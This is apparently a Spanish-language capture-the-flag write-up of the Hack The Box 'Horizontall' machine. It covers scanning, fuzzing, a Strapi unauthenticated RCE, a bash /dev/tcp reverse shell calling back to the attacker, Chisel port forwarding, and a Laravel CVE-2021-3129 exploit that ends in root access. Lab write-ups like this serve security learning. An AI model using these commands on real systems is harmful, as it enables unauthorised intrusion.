
---
 - Tags: #InfoLeak #portforwarding #web #cms #HTB #Easy 
---- 

#### QUÉ SE EXPLOTA?

nformación sensible filtrada (headers, `.env`, metadatos, stack traces) y servicios internos accesibles mediante port forwarding/túneles; en Strapi se atacan endpoints administrativos, uploads y plugins vulnerables para escalada/RCE; en Laravel se buscan `.env` expuestos, deserializaciones inseguras, uploads, SQLi, SSRF y fallos en rutas/middlewares para obtener ejecución de código o acceso a datos.

#### Write UP 

##### PRIMER FASE: Escaneo

Empezamos la maquina escaneando la IP proporcionada. Ocupamos un SS con nmap para ir de manera rapida y descubrir de primera todos lo puertos abiertos, una vez descubriendo los primeros puertos con nmap proseguimos a un segundo especificando los primeros puertos encontrados.

```bash
nmap -p- -sS -Pn -n --open --min-rate 5000 [IP] -oN GenPort_scan

nmap -sCV -p... [IP] -oN DetPort_scan
```

![[Pasted image 20251009185743.png]]

Encontramos el puerto 80 abierto, que como ya sabemos corre el servicio http. Además también encontramos el puerto 22 abierto que hace referencia a SSH. Primeramente vamos a checar la pagina web que está corriendo por eses puerto. 

![[Pasted image 20251009190030.png]]


Como en otras ocasiones veemos que nos está incluyendo directamente el nombre del dominio en lugar de la IP por lo que tenemos que indicar que la IP está ligada al dominio **horizontall.htb**. En este caso tenemos que agregar el dominio a la ruta de **[[etc-hosts]]**.
![[Pasted image 20251009194137.png]]

Ya tenemos acceso al contenido...
![[Pasted image 20251009194212.png]]

**Inspeccionamos la pagina pero no encontramos absolutamente nada util...**


##### SEGUNDA FASE: Explotación 

Ya que no encontramos nada relevante pasaremos a hacer un ataque de **fuerza bruta sobre directorios...** A pesar de que no estamos explotando nada realmente lo tenemos que incluir dentro de esta etapa ya que esto deja muchos logs en el servidor por lo que es muy intrusivo. 

Para esta fase utilizaremos [[wfuzz]]

![[Pasted image 20251009195824.png]]
```bash
wfuzz -c -t 200 --hc=404 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt "http://horizontall.htb/FUZZ"
```

No encontramos ni una ruta relevante por lo que inspeccionamos el codigo...

![[Pasted image 20251009200232.png]]

Se veía así, por lo que mejor mandamos a traerlo con **curl** y posteriormente le pasamos un **htmlq -p** para que se viera mejor. 

![[Pasted image 20251009200350.png]]

Encontramos que hay algunas rutas por lo que filtramos con grep, etc.. para quedarnos con las tuas 'app' que parecen ser de aplicación..

el ersultado fue...

![[Pasted image 20251009200522.png]]

entramos a la ruta '.js'...

![[Pasted image 20251009200708.png]]

Procedimos a buscar a ver si encontrabamos algo que tuviera relación con el dominio **.htb** por lo que utilizamos la herramienta de busqueda de Firefox para buscar el dominio. 

Encontramos...

![[Pasted image 20251010130326.png]]

Obtuvimos la ruta: ```http://api-prod.horizontall.htb/reviews```La agregamos al [[etc-hosts]] y accedemos a ella...

Nos topamos con una ruta en formato [[json]] 

![[Pasted image 20251010131047.png]]
Lo mandamos a llamar con curl y lo visualizamos con **jq**. 
**JQ** nos va a servir para visualizar JSON's de manera más bonita y limpia. 

![[Pasted image 20251010131203.png]]

Seguimos investigando toda la ruta... y por el momento estamos en api-prod.horizontall.htb/reviews, por ende, podríamos ver que otras rutas además de reviews hay... En el raíz no hay nada..
![[Pasted image 20251010131328.png]]

Vamos a hacer [[Fuzzing]] nuevamente con [[wfuzz]]. 

encontramos...

![[Pasted image 20251010131459.png]]

Al probar con admin nos redirige a... **[[Strapi]]**

![[Pasted image 20251010131610.png]]

**users** se muestra como forbidden...

Antes de investigar qué es Strapí, vamos a buscar más rutas ya que esa ruta apareció al haber entrado a **/admin** sin embargo, puede que haya más rutas... **/admin/....***

Se encontraron rutas alternativas a **/auth**:

![[Pasted image 20251010132135.png]]

no encontramos nada muy relevante con esas rutas, sin embargo si pudimos encontrar la versión de Strapi dentro de **init**

![[Pasted image 20251010132244.png]]


buscamos si hay algo relacionado a [[Strapi]] 3.0.0 con [[searchsploit]]

![[Pasted image 20251010132311.png]]
Hay un exploit de RCE (UNAUTHENTICATED).

Nos lo copiamos a nuestra maquina y lo ejecutamos.

![[Pasted image 20251010132812.png]]

al parecer el RCE es ciego, es decir... no vemos nada en pantalla, para ver si efectivamente sirve nos vamos a tirar un **ping -c 1** a nosotros mismos para ver si hay conexión...

vamos a ponernos en escucha con [[tcpdump]] ponemos la tun0 ya que es la vpn la que nos conecta con HTB

```bash
tcpdump -i tun0 -n icmp
```

![[Pasted image 20251010135644.png]]

Sí hay ejecución de comandos por lo que proseguimos a hacer una [[Reverse shell.]]
vamos a entablarnos una shell con un archivo sh desde nuestra computadora. 

EL script se llamará sh. Cuando lo mandemos a llamar desde el RCE le pediremos que lo interpreté con bash. 
```bash
bash -i >& /dev/tcp/ip/port/ 0>&1
```


![[Pasted image 20251010140134.png]]

nos ponemos en escucha con [[NETCAT]].
![[Pasted image 20251010140410.png]]
Y ganamos conexión.

Estabilizamos la TTY y pasamos a postexplotación.

##### TERCERA FASE: Postexplotación

Buscamos archivos para poder escalar privilegios, así como tareas cron y no encontramos nada. Nos pusimos a ver si podiamos encontrar algo, y para eso **checamos nuestra IP... no concordaba con la ip original.** Por lo que checamos con 
```bash
nestat -nat
```

los puertos de nuestro equipo y las conexiones establecidas. 

![[Pasted image 20251010141335.png]]

vemos que hay algo corriendo por el 8000, por lo que necesitamos ver que hay, sin embargo, únicamente lo prodiamos ver con curl, ya que al estar en la  red interna, no tenemos acceso a él. 

Para poder inspeccionar mejor, nos montamos un tunel para hacer [[Port Forwarding]] 
Para eso ocupamos [[Chisel]], nos lo compartimos a través de un servidor **python3** (LA VERSIÓN QUE OCUPAMOS DE CHISEL TIENE QUE SER MÁS BAJA DEBIDO A QUE NO SOPORTA VERSIONES NUEVAS)
Montamos el tunel.
y entablamos conexión

![[Pasted image 20251010145109.png]]

Ahora si inspeccionamos el localhost:8000 vemos algo que dice [[Laravel]]. 

![[Pasted image 20251010145154.png]]

buscamos en [[searchsploit]] algo relacionado a Laravel ya que además tenemos la versión, encontramos diferentes exploits, por lo que ahora buscamos más relacionado a Laravel. 

Encontramos el siguiente exploit en [github](https://github.com/nth347/CVE-2021-3129_exploit) 

ejecutamos el epxploit y es un RCE por lo que nos mandamos una [[Reverse shell]] 

lo ejecutamos y ganamos acceso a root:

![[Pasted image 20251010152043.png]]